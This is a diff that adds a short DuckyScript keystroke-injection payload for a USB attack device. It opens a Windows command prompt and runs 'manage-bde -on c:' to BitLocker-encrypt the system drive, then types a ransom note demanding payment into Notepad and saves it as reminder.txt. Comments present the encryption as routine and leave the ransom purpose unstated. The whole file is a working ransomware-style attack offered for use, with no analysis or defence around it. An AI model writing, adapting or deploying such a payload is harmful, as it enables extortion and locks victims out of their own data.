@@ -1,0 +1,28 @@
+DELAY 1000
+GUI r
+DELAY 500
+STRING cmd
+DELAY 500
+ENTER
+DELAY 500
+STRING manage-bde -on c:
+DELAY 500
+ENTER
+
+REM This will start the encryption process. You will be prompted to enter a password to encrypt the device.
+REM Make sure to remember the password as it will be required to access the device.
+
+DELAY 10000
+GUI r
+DELAY 500
+STRING notepad
+DELAY 500
+ENTER
+DELAY 500
+STRING REMINDER: Pay XXXX to XXXX with a screenshot to XXX for payment confirmation
+DELAY 500
+CTRL s
+DELAY 500
+STRING reminder.txt
+DELAY 500
+ENTER
